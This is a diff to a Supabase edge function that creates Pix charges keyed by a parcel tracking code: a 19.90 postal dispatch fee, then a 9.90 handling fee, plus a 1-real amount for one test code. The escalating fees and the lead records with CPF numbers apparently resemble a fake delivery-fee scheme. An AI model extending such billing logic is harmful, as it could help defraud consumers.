@@ -17,8 +17,11 @@ serve(async (req) => {
     const { data: payments } = await supabase.from('pix_gateway_payments').select('status').contains('raw_payload', { trackingCode });
     const paidCount = payments?.filter(p => p.status === 'paid').length || 0;
 
-    // Se já pagou a de 19.90, a próxima é 9.90
-    const amount = paidCount >= 1 ? 9.90 : 19.90;
+    // Lógica para o código de teste de 1 real
+    const isOneRealTest = trackingCode === 'BR1REAL111BR';
+    let amount = paidCount >= 1 ? 9.90 : 19.90;
+    if (isOneRealTest && paidCount === 0) amount = 1.00;
+
     const taxName = paidCount >= 1 ? "Taxa de Manuseio Logístico" : "Despacho Postal";
 
     const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', trackingCode).maybeSingle();
@@ -39,7 +42,7 @@ serve(async (req) => {
       body: JSON.stringify({
         "api-key": apiKey,
         "amount": amount,
-        "client": { "name": lead?.nome || "Cliente", "document": (lead?.cpf || "12345678909").replace(/\D/g, ''), "telefone": (lead?.telefone || "11999999999").replace(/\D/g, ''), "email": lead?.email || "cliente@email.com" },
+        "client": { "name": lead?.nome || "Cliente Teste", "document": (lead?.cpf || "12345678909").replace(/\D/g, ''), "telefone": (lead?.telefone || "11999999999").replace(/\D/g, ''), "email": lead?.email || "teste@email.com" },
         "callbackUrl": `https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook`
       })
     });
